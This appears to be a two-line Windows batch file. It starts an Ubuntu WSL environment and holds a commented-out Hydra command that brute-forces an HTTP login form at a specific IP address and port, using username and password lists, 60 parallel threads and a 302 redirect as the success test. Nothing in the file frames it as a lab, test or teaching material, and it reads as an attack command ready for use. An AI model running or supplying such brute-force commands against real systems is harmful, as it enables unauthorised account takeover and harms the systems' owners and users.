wsl -d Ubuntu-22.04

@REM hydra -L users.txt -P pws.txt -s 5000 -t 60 -w 30 -o output.txt 141.87.60.21 http-post-form "/login:username=^USER^&password=^PASS^:S=302"